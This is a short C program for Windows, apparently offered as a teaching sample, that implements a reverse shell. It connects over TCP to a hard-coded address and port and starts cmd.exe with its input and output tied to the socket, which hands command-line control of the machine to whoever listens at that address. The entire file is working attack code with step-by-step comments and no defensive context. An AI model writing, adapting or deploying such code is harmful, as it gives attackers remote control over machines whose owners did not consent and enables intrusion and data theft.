#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// remember to include the winsock lib to the project 
#pragma comment(lib,"ws2_32")

void doShell(){
    // initialization
    WSADATA wsaData;
    SOCKET s1;
    struct sockaddr_in hax;
    char ip_addr[16];
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    char Process[] = "cmd.exe";

    // WSAStartup is needed as well
	WSAStartup(MAKEWORD(2, 2), &wsaData);
    // we'll only have one socket in here as we already know where we'll send the process 
    // WSASocket == socket 
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    // socket info
	hax.sin_family = AF_INET;
	hax.sin_port = htons(4443);
	hax.sin_addr.s_addr = inet_addr("192.168.0.50");
    // WSAConnect == connect() 
	if(WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR){
		    printf("error %d \n", WSAGetLastError());
			closesocket(s1);
			WSACleanup();
    }
    else{
        printf("connecting \n");
        // sui == processinfo 
        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        // and we just send to the socket
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
        // creating a process for cmd.exe, sending to s1 
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        // we want to keep it up until the user closes 
        WaitForSingleObject(pi.hProcess, INFINITE);
        // house cleaning
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(s1);
        WSACleanup();
        printf("shell closed \n");
    }

}

int main(int argc, char* argv[]){

    printf("reverse shell going on: \n");

    doShell();

}
